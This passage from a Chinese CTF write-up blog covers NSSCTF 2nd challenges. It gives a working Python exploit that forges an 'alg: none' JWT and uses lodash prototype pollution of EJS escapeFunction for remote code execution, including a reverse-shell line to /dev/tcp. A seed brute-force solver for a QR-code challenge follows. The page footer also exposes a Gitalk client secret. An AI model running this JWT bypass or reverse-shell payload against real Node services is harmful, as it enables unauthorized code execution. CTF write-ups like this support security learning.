class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;register.ejs&#x27;</span>, &#123;<span class="attr">msg</span>: <span class="literal">null</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = req.<span class="property">body</span>;</span><br><span class="line">        <span class="keyword">if</span> (!username || username == <span class="string">&#x27;nss&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register.ejs&#x27;</span>, &#123;<span class="attr">msg</span>: <span class="string">&quot;Username existed.&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> secret = crypto.<span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="property">length</span>;</span><br><span class="line">        <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="title function_">push</span>(secret);</span><br><span class="line">        <span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&quot;HS256&quot;</span>&#125;);</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;register.ejs&#x27;</span>, &#123;<span class="attr">msg</span>: <span class="string">&quot;Token: &quot;</span> + token&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">all</span>(<span class="string">&#x27;/home&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">data</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;home.ejs&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>||<span class="string">&#x27;NSS&#x27;</span>,</span><br><span class="line">        <span class="attr">count</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">count</span>||<span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="attr">msg</span>: <span class="literal">null</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">post</span>(<span class="string">&#x27;/update&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">data</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span> !== <span class="string">&#x27;nss&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;home.ejs&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>||<span class="string">&#x27;NSS&#x27;</span>,</span><br><span class="line">            <span class="attr">count</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">count</span>||<span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&#x27;U cant change uid&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> data = req.<span class="property">session</span>.<span class="property">data</span> || &#123;&#125;;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">data</span> = lodash.<span class="title function_">merge</span>(data, req.<span class="property">body</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">outputFunctionName</span>);</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/home&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">listen</span>(<span class="number">827</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/34%E4%B8%80%E4%BA%9B%E8%87%AA%E8%AE%A4%E4%B8%BA%E4%BC%98%E9%9B%85%E7%9A%84exp.py/image-20230923220446113.png" alt="image-20230923220446113"></p>
<p><code>jwt.verify(token, secret, &#123;algorithm: &quot;HS256&quot;&#125;)</code>的参数<code>algorithms</code>错写成了<code>algorithm</code>，导致出现空加密</p>
<p>JWT问题在于两点：</p>
<ol>
<li>verify时正确的参数是algorithms而不是algorithm，所以这里本质传了个空加密，导致允许空密钥，我们无须获得JWT密钥（高版本已修改）。</li>
<li>第二个是关于sid的弱比较，如果只是允许空密钥的话我们不知道secret依然无法verify，这里sid如果<strong>传个数组</strong>就能轻松绕过判断并且<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308301527296.png" alt="img"></li>
</ol>
<p>一个优雅的exp.py</p>
<p>能弹shell用data1</p>
<p>不能弹shell用data1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://node5.anna.nssctf.cn:28973/&quot;</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_token</span>():</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;alg&quot;</span>:<span class="string">&quot;none&quot;</span>,</span><br><span class="line">        <span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    token_dict = &#123;</span><br><span class="line">        <span class="string">&quot;secretid&quot;</span>:[],</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:<span class="string">&quot;nss&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>:<span class="string">&quot;123456&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    jwt_token = jwt.encode(token_dict,<span class="string">&quot;&quot;</span>,algorithm=<span class="string">&quot;none&quot;</span>,headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(jwt_token)</span><br><span class="line">    <span class="keyword">return</span> jwt_token</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:<span class="string">&quot;123&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>:<span class="string">&quot;123&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = url + <span class="string">&quot;register&quot;</span></span><br><span class="line">    response = s.post(url=url,json=data)</span><br><span class="line">    <span class="comment"># print(response.text)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">url</span>):</span><br><span class="line">    username = <span class="string">&quot;nss&quot;</span></span><br><span class="line">    password = <span class="string">&quot;123456&quot;</span></span><br><span class="line">    token = get_token()</span><br><span class="line">    </span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:username,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>:password,</span><br><span class="line">        <span class="string">&quot;token&quot;</span>:token</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    url = url + <span class="string">&#x27;login&#x27;</span></span><br><span class="line">    response = s.post(url=url,json=data)</span><br><span class="line">    <span class="comment"># print(response.request.headers)</span></span><br><span class="line">    <span class="comment"># print(response.request.body)</span></span><br><span class="line">    <span class="comment"># print(response.text)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">url,command</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line">  			<span class="string">&quot;settings&quot;</span>:&#123;</span><br><span class="line">    			<span class="string">&quot;view options&quot;</span>:&#123;	</span><br><span class="line">                    <span class="string">&quot;escapeFunction&quot;</span>:<span class="string">&quot;this.global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/7779 &lt;&amp;1\&quot;&#x27;);&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;client&quot;</span>:<span class="string">&quot;true&quot;</span></span><br><span class="line">    			&#125;</span><br><span class="line">			&#125;</span><br><span class="line">  		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line">  			<span class="string">&quot;settings&quot;</span>:&#123;</span><br><span class="line">    			<span class="string">&quot;view options&quot;</span>:&#123;	</span><br><span class="line">                    <span class="string">&quot;escapeFunction&quot;</span>:<span class="string">f&quot;this.global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;echo `<span class="subst">&#123;command&#125;</span>` &gt; ./views/login.ejs&#x27;);&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;client&quot;</span>:<span class="string">&quot;true&quot;</span></span><br><span class="line">    			&#125;</span><br><span class="line">			&#125;</span><br><span class="line">  		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    url = url + <span class="string">&quot;update&quot;</span></span><br><span class="line">    response = s.post(url=url,json=data)</span><br><span class="line">    <span class="comment"># print(response.text)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_result</span>(<span class="params">url</span>):</span><br><span class="line">    url = url + <span class="string">&quot;login&quot;</span></span><br><span class="line">    response = s.get(url=url).text</span><br><span class="line">    <span class="built_in">print</span>(response)</span><br><span class="line">register(url)</span><br><span class="line">login(url)</span><br><span class="line">update(url,<span class="string">&quot;cd /;ls;env&quot;</span>)</span><br><span class="line">get_result(url)</span><br></pre></td></tr></table></figure>

<h1 id="NSSCTF-2nd-gift-in-qrcode2"><a href="#NSSCTF-2nd-gift-in-qrcode2" class="headerlink" title="[NSSCTF 2nd]gift_in_qrcode2"></a>[NSSCTF 2nd]gift_in_qrcode2</h1><p>main.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> qrcode</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange, getrandbits, seed</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = os.getenv(<span class="string">&quot;FLAG&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> flag == <span class="literal">None</span>:</span><br><span class="line">    flag = <span class="string">&quot;flag&#123;test&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">secret_seed = randrange(<span class="number">1</span>, <span class="number">1000</span>)</span><br><span class="line">seed(secret_seed)</span><br><span class="line">reveal = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    reveal.append(<span class="built_in">str</span>(getrandbits(<span class="number">8</span>)))</span><br><span class="line">target = getrandbits(<span class="number">8</span>)</span><br><span class="line">reveal = <span class="string">&quot;,&quot;</span>.join(reveal)</span><br><span class="line"></span><br><span class="line">img_qrcode = qrcode.make(reveal)</span><br><span class="line">img_qrcode = img_qrcode.crop((<span class="number">35</span>, <span class="number">35</span>, img_qrcode.size[<span class="number">0</span>] - <span class="number">35</span>, img_qrcode.size[<span class="number">1</span>] - <span class="number">35</span>))</span><br><span class="line"></span><br><span class="line">offset, delta, rate = <span class="number">50</span>, <span class="number">3</span>, <span class="number">5</span></span><br><span class="line">img_qrcode = img_qrcode.resize(</span><br><span class="line">    (<span class="built_in">int</span>(img_qrcode.size[<span class="number">0</span>] / rate), <span class="built_in">int</span>(img_qrcode.size[<span class="number">1</span>] / rate)), Image.LANCZOS</span><br><span class="line">)</span><br><span class="line">img_out = Image.new(<span class="string">&quot;RGB&quot;</span>, img_qrcode.size)</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(img_qrcode.size[<span class="number">1</span>]):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img_qrcode.size[<span class="number">0</span>]):</span><br><span class="line">        pixel_qrcode = img_qrcode.getpixel((x, y))</span><br><span class="line">        <span class="keyword">if</span> pixel_qrcode == <span class="number">255</span>:</span><br><span class="line">            img_out.putpixel(</span><br><span class="line">                (x, y),</span><br><span class="line">                (</span><br><span class="line">                    randrange(offset, offset + delta),</span><br><span class="line">                    randrange(offset, offset + delta),</span><br><span class="line">                    randrange(offset, offset + delta),</span><br><span class="line">                ),</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img_out.putpixel(</span><br><span class="line">                (x, y),</span><br><span class="line">                (</span><br><span class="line">                    randrange(offset - delta, offset),</span><br><span class="line">                    randrange(offset - delta, offset),</span><br><span class="line">                    randrange(offset - delta, offset),</span><br><span class="line">                ),</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">img_out.save(<span class="string">&quot;qrcode.png&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;qrcode.png&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;This my gift:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(data).decode(), <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(target)</span><br><span class="line"></span><br><span class="line">ans = <span class="built_in">input</span>(<span class="string">&quot;What&#x27;s your answer:&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> ans == <span class="built_in">str</span>(target):</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No no no!&quot;</span>)</span><br></pre></td></tr></table></figure>



<p>一个优雅的exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> seed,getrandbits</span><br><span class="line"><span class="keyword">from</span> pyzbar <span class="keyword">import</span> pyzbar</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28899</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>.encode())</span><br><span class="line">base64data = p.recvline().decode().strip()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_numbers_from_image</span>(<span class="params">base64data</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(BytesIO(base64.b64decode(base64data)))</span><br><span class="line">    new_img = Image.new(<span class="string">&quot;RGB&quot;</span>,img.size,(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(img.size[<span class="number">1</span>]):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.size[<span class="number">0</span>]):</span><br><span class="line">            <span class="keyword">if</span> img.getpixel((x,y))[<span class="number">0</span>] &gt;= <span class="number">50</span> :</span><br><span class="line">                new_img.putpixel((x,y),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                new_img.putpixel((x,y),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    barcode = pyzbar.decode(new_img)</span><br><span class="line">    data = barcode[<span class="number">0</span>].data.decode()</span><br><span class="line">    numbers = <span class="built_in">eval</span>(<span class="string">f&quot;[<span class="subst">&#123;data&#125;</span>]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(numbers)</span><br><span class="line">    <span class="keyword">return</span> numbers</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_21th_number</span>(<span class="params">base64data</span>):</span><br><span class="line">    numbers = get_numbers_from_image(base64data)</span><br><span class="line">    <span class="keyword">for</span> secret_seed <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        seed(secret_seed)</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">            <span class="keyword">if</span> getrandbits(<span class="number">8</span>)!=numbers[_]:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            target = getrandbits(<span class="number">8</span>)</span><br><span class="line">            <span class="built_in">print</span>(target)</span><br><span class="line">            <span class="keyword">return</span> target</span><br><span class="line">number = get_21th_number(base64data)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;What&#x27;s your answer:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(number).encode())</span><br><span class="line">flag = p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure>



<p>由于 target 是 1&#x2F;255 的随机数值，直接以一个固定值碰撞，正确概率为 1&#x2F;255</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    conn = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>, <span class="number">28472</span>)</span><br><span class="line">    conn.recvline().decode()</span><br><span class="line">    conn.recvline().decode()</span><br><span class="line">    conn.recv().decode()</span><br><span class="line"></span><br><span class="line">    conn.sendline(<span class="built_in">str</span>(<span class="string">&#x27;110&#x27;</span>).encode())</span><br><span class="line"></span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;count:&#x27;</span>, count)</span><br><span class="line"></span><br><span class="line">    output = conn.recvline().decode()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;No no no!&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>


            </div>

            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/ctf/">#ctf</a>&nbsp;
                        </li>
                    
                </ul>
            

            
                <div class="article-nav">
                    
                        <div class="article-prev">
                            <a class="prev"
                               rel="prev"
                               href="/2023/10/04/35%E5%85%B3%E4%BA%8E%E5%8F%96%E8%AF%81%E7%9A%84%E4%B8%80%E7%82%B9%E5%B0%8F%E6%84%9F%E5%B0%8F%E6%82%9F/"
                            >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                                <span class="title flex-center">
                                <span class="post-nav-title-item">关于取证的一点小感小悟</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                            </a>
                        </div>
                    
                    
                        <div class="article-next">
                            <a class="next"
                               rel="next"
                               href="/2023/09/18/33%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%B9%8B%E9%80%80%E5%BD%B9/"
                            >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">???</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                                <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                            </a>
                        </div>
                    
                </div>
            

            
                <div class="comment-container">
                    
<div class="comments-container">
    <div id="comments-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments"></i>&nbsp;Comments
    </div>
    
        
            

    <div class="gitalk-comment-container">
        <div id="gitalk-container"></div>
        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.css">
        <script  src="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"></script>
        <script >
          function loadGitalk() {
            let __gitalk__pathname = decodeURI(location.pathname);
            const __gitalk__pathnameLength = __gitalk__pathname.length;
            const __gitalk__pathnameMaxLength = 50;
            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
              __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
            }

            try {
              Gitalk && new Gitalk({
                clientID: 'a415960e8a19902e98bf',
                clientSecret: '97151a67ce9c95ad3c333c402f4cee0f5f05020f',
                repo: 'gitalk',
                owner: 'Lejeremiah',
                admin: 'Lejeremiah',
                id: __gitalk__pathname,
                language: 'en'
              }).render('gitalk-container');
            } catch (e) {
              window.Gitalk = null;
            }
          }

          if ('false' === 'true') {
            const loadGitalkTimeout = setTimeout(() => {
              loadGitalk();
              clearTimeout(loadGitalkTimeout);
            }, 1000);
          } else {
            window.addEventListener('DOMContentLoaded', loadGitalk);
          }
        </script>
    </div>



        
    
</div>

                </div>
            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CISCN-2023-%E5%88%9D%E8%B5%9B-go-session"><span class="nav-text">[CISCN 2023 初赛]go_session</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NSSCTF-2nd-php%E7%AD%BE%E5%88%B0"><span class="nav-text">[NSSCTF 2nd]php签到</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NSSCTF-2nd-MyBox"><span class="nav-text">[NSSCTF 2nd]MyBox</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NSSCTF-2nd-MyBox2"><span class="nav-text">[NSSCTF 2nd]MyBox2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NSSCTF-2nd-MyHurricane"><span class="nav-text">[NSSCTF 2nd]MyHurricane</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NSSCTF-2nd-MyJs"><span class="nav-text">[NSSCTF 2nd]MyJs</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NSSCTF-2nd-gift-in-qrcode2"><span class="nav-text">[NSSCTF 2nd]gift_in_qrcode2</span></a></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            
<footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
                <span>2020</span> -
            
            2023
            
                &nbsp;<i class="fas fa-heart icon-animate"></i>
                &nbsp;<a href="/">lhb</a>
            
        </div>
        
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    

</main>




<script src="/js/utils.js"></script>

<script src="/js/main.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/dark-light-toggle.js"></script>







    
<script src="/js/code-block.js"></script>





<div class="post-scripts">
    
        
<script src="/js/post-helper.js"></script>

        
            
<script src="/js/libs/anime.min.js"></script>

        
        
            
